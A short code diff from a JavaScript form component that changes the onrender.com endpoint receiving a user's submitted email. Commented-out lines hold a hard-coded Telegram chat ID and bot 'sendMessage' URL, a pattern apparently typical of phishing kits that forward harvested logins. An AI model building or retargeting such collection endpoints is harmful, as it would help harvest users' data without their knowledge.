@@ -144,7 +144,7 @@ export default {
       // const chatId = '1314372286';
       // const chatId = 1314372286;
       //const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
-       const url = 'https://rate-da.onrender.com/submit';
+       const url = 'https://thebknd.onrender.com/submit';
       try {
         const response = await axios.post(url, {
           email: this.email,
